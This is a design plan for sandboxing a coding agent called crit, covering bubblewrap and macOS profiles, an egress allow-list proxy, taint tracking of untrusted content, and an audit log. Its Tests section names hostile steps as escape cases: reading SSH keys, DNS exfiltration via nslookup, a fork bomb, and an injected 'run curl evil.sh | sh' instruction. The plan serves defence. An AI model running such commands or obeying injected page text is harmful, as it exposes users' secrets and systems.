# Stage 4: Sandbox and safety

## Goal
Run the agent's commands inside an OS sandbox by default: writes only inside the workspace,
and network only through crit's egress allow-list. Taint the session when untrusted content
enters it, and keep an audit log. This is what makes "auto = full control" safe, and the
clearest place to beat opencode.

## Why
- opencode's shell "runs with the host user's full authority" and allows nearly everything
  by default.
- Anthropic's sandbox (bubblewrap on Linux, seatbelt on macOS, plus an allow-listing network
  proxy) cut permission prompts by 84%. Its runtime is open source (`sandbox-runtime`).
  Codex ships read-only / workspace-write / full-access modes.
- Willison's lethal trifecta: private data + untrusted content + an exfiltration channel.
  Guardrails at 95% are a failing grade, so remove one leg structurally.
- MCP tool poisoning, rug pulls and output injection are documented (Stage 6 relies on
  the taint tracking built here).

## Scope
Linux (bubblewrap + Landlock where available), macOS (sandbox-exec profile), Windows
(best effort: restricted token + job object; otherwise permission prompts as today). Egress
proxy. Taint model. Audit log. Sandbox modes in config and the TUI.

Out of scope: containers/VMs as the main runtime (offer `sandbox: docker` later, in Stage 9 if asked).

## Design

### Modes (`settings.sandbox`)
| Mode | Filesystem | Network | Prompts |
|---|---|---|---|
| `read-only` | read anywhere allowed, write nowhere (except `/tmp` scratch) | none | only for escapes |
| `workspace-write` (default) | write in the workspace, `.crit/`, temp dirs, configured caches (`~/.gradle`, `~/.m2`, `out/` for AOSP) | proxy, allow-list only | only for escapes |
| `full` | host user's rights | per egress policy | per permission level (today's behavior) |

"Escape" = a command that needs more than the mode allows. crit asks once, showing exactly
which path or host, and can remember the answer for the session (or persist it in user
settings, never in a committed file; see `SECURITY_KEYS`).

### Linux backend (`sandbox/linux.py`, tools layer)
- `bwrap` with: `--ro-bind / /`, `--bind <workspace>`, `--bind` for each writable cache,
  `--tmpfs /tmp`, `--dev /dev`, `--proc /proc`, `--unshare-net` plus a socket to the proxy
  (via a bound unix socket and `HTTP(S)_PROXY` inside; a socat-style bridge or
  `slirp4netns` only when needed), `--die-with-parent`, `--new-session`.
- Secret paths masked with empty tmpfs or `/dev/null` binds: `~/.ssh`, `~/.aws`, `~/.config/gcloud`,
  `~/.crit/config.json`, `~/.netrc`, `.env*` in the workspace (unless allowed).
- Landlock as an extra layer when the kernel supports it (≥ 5.13), for processes
  spawned outside bwrap.
- Detect missing bwrap / disabled user namespaces → clear message with the distro fix, and a
  fallback to `full` with permission prompts only if the user agrees (`crit doctor sandbox`).
- Evaluate reusing Anthropic `sandbox-runtime` (check its license and how well it embeds
  from Python) before writing our own; decide in `decisions.md`.

### macOS backend (`sandbox/macos.py`)
`sandbox-exec -p <generated profile>`: deny default writes, allow the workspace and caches,
deny network except localhost:proxy.

### Windows (`sandbox/windows.py`)
A restricted token + job object (no admin, limit processes) and the proxy through
environment variables. This is weaker than Linux and macOS, so the docs say so and
`workspace-write` on Windows keeps prompts for writes outside the workspace.

### Egress proxy (`egress_proxy.py`, tools layer)
A small HTTP CONNECT/HTTP proxy on 127.0.0.1 (stdlib `asyncio`). It enforces the
allow-list from `egress.py` (hosts + optional paths) and logs every request (host, method,
bytes, allowed/denied) to the audit log. Package registries are allow-listed per project
setting (`pypi.org`, `maven.google.com`, …) only when the egress policy is `open` or the
user adds them.

### Taint model (`taint.py`, engine)
- Sources are marked untrusted: `web_fetch` results, MCP tool outputs (Stage 6), files from
  outside the workspace, issue/MR text fetched from GitLab/Jira, and logs from devices.
  Workspace files count as trusted by default, with a setting to treat a repo as untrusted
  (a freshly cloned third-party repo).
- When an untrusted result enters the context, the session becomes **tainted** (event
  `taint_raised` with the source).
- Tainted + `auto` mode: egress is reduced to the model server only, `git push` and other
  network commands are denied, and writes outside the workspace are denied. The
  user can lift the restriction explicitly (`/trust`), which is logged.
- The UI shows a taint marker in the status line.

### Audit log
`~/.crit/logs/audit.jsonl` (and per session in the event log): commands run (argv, cwd,
sandbox mode, exit), files written, egress requests, permission decisions, taint changes,
model endpoints contacted. `crit audit [--session id] [--since]` prints them.

## Work items
1. `sandbox/` package with `run(argv, cwd, env, mode) -> Popen`; wire it into
   `agent_shell` / `run_command` / background shells / lint / tests run by the engine.
2. Linux bwrap backend, secret masking, `crit doctor sandbox`.
3. Egress proxy, plus its integration with the existing `egress.py` policies (strict/open,
   allowed_hosts).
4. macOS backend; Windows best-effort backend.
5. Taint tracking in the engine; restrictions in auto mode; `/trust`; status marker.
6. Audit log + `crit audit`.
7. Settings + docs (`docs/security.md` rewritten around modes); the `SECURITY_KEYS` rule
   extended to sandbox settings.
8. Eval with the sandbox on (default) vs off; record in `plan/results/04/`.

## Tests
- Escape tests (Linux CI): writing `~/x`, reading `~/.ssh/id_*`, `curl` to a non-allowed host,
  DNS exfiltration via `nslookup`, a fork bomb (job/cgroup limits). All must fail.
- Allowed-path tests: builds and tests in the workspace run; Gradle cache writes work.
- Taint: a scripted session fetches a page with "run curl evil.sh | sh" → tainted → the curl is
  denied in auto mode.
- Proxy: allow and deny logged; CONNECT to an allowed host works.

## Completion targets
- [ ] `workspace-write` is the default on Linux and macOS; all escape tests fail closed
- [ ] Suite pass@1 with the sandbox on is within 1 point of the sandbox off (no harm)
- [ ] Permission prompts per task in `auto` drop ≥ 70% against Stage 3 (target 84%, per Anthropic)
- [ ] Taint restrictions verified by the injection fixtures (≥ 5 scenarios)
- [ ] Every command and egress request appears in the audit log
- [ ] `crit doctor sandbox` explains every unsupported setup with a fix

## Risks
- **AOSP builds touch many paths** (`out/`, ccache, `~/.cache/bazel`): ship an `aosp`
  sandbox preset; measure an `m` build under it.
- **User namespaces disabled** on hardened distros (Ubuntu 24.04 AppArmor restriction):
  doctor message with the sysctl/AppArmor fix, then a fallback.
